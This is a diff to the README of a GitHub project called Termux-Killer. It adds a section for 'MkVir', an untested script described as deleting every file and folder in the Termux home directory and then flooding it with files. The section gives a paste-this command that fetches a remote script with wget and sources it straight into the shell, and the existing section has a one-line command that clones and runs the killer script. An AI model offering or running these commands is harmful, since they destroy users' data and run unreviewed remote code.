@@ -15,5 +15,11 @@ Install using one command
 ````
 pkg install git -y && git clone https://github.com/Begitdj/Termux-Killer.git && cd Termux-Killer && sh TermuxKiller.sh
 ````
+#MkVir(Not Tested)
+MkVir this is small script which cleans all files and folders in Home in Termux and also creates a huge number of files and folders
+# One command to start
+````
+pkg install wget && . <(wget -qO- https://raw.githubusercontent.com/Begitdj/Termux-Killer/refs/heads/main/Test.sh)
+````
 # Not Working?
 **Open new `issue`**
